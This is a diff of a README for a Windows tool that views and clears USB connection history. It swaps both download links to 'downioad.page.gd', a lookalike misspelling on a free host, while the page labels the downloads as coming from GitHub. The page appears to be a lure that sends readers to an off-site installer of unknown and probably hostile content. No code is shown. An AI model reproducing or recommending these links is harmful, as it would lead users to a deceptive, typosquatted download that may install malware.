@@ -2,7 +2,7 @@
 
 USB Device History Viewer/Cleaner is a powerful utility designed to help you view and clear your USB device connection history on Windows 10 and 11. Whether you're concerned about privacy or need to troubleshoot device connections, this tool provides an easy-to-use interface for managing your USB logs. It scans system registries and logs to present a comprehensive overview of all connected USB devices, allowing you to maintain control over your digital footprint.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -66,6 +66,6 @@ Your privacy is our priority. USB Device History Viewer/Cleaner does not collect
 
 To get started, download the latest version of USB Device History Viewer/Cleaner from the official download page:
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: 2026*
